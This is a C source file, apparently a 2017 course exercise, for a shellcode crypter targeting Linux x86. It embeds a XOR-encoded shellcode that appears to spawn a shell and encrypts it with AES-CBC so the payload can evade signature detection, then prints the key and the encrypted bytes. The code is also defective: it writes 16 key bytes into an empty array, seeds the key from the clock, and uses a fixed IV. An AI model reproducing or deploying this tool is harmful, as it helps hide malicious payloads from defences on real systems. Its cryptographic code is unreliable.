/*
  
  Custom AES Shellcode Crypter (Linux x86/32 Bits)
  (c) 2017 dabooze / Dilsec
 
  http://dilsec.com
  @dab00ze
 
  Licensed under CC 3.0 (http://creativecommons.org/licenses/by-sa/3.0/)
 
  This bit of code takes a given shellcode, generates a random 128 bit AES key
  and encrypts the shellcode with AES-CBC. The key and the crypted bytes are
  then printed out to the console.

  Please note: This awesome (and tiny!) AES implementation had been taken
  from the following URL: https://github.com/kokke/tiny-AES128-C

  Initially wanted to write something more fancy that takes parameters from 
  STDIN, but ran out of time (CTP/OSCE course is waiting :-)).

*/

#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>
#include <time.h>

#define CBC 1

#include "aes.h"

// shellcode needs to be multiple of 16 bytes due to AES CBC block size
unsigned char shellcode[] = \
"\xeb\x0d\x5e\x31\xc9\xb1\x19\x80\x36\xaa\x46\xe2\xfa\xeb\x05\xe8"
"\xee\xff\xff\xff\x9b\x6a\xfa\xc2\x85\x85\xd9\xc2\xc2\x85\xc8\xc3"
"\xc4\x23\x49\xfa\x23\x48\xf9\x23\x4b\x1a\xa1\x67\x2a\x90\x90\x90";

unsigned char key[] = {};

static void phex(uint8_t* str);

static void encrypt_aes_cbc(unsigned char* key);
static unsigned char * generate_random_key(void); 

int main(void)
{
	encrypt_aes_cbc(generate_random_key());
	return 0;
}

// prints string as hex
static void phex(uint8_t* str)
{
	unsigned char i;
	for(i = 0; i < 16; ++i)
		printf("%.2x", str[i]);
	printf("\n");
}

unsigned char * generate_random_key(void)
{
	srand(time(NULL));
	for (int i=0;i<16;i++)
		key[i] = rand() % 256;

	return key;
}

static void encrypt_aes_cbc(unsigned char* key)
{
	unsigned char encrypted_byte, key_byte;
	int counter;

	uint8_t iv[]  = { 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f };

	unsigned char* dst_buffer = malloc(strlen(shellcode));

	AES128_CBC_encrypt_buffer(dst_buffer, shellcode, strlen(shellcode), key, iv);

	printf("\n");
	
	printf("[*] Dumping generated random AES Encryption Key\n\n");

	for (counter=0; counter< 16; counter++)
	{

		key_byte = key[counter];

		printf("\\x%02x", key_byte);	

	}	

	printf("\n\n");	

	printf("[*] Dumping AES Encrypted Shellcode\n\n");

	for (counter=0; counter< strlen(shellcode); counter++)
	{

		encrypted_byte = dst_buffer[counter];

		printf("\\x%02x", encrypted_byte);	

	}

	printf("\n\n");

	free(dst_buffer);

}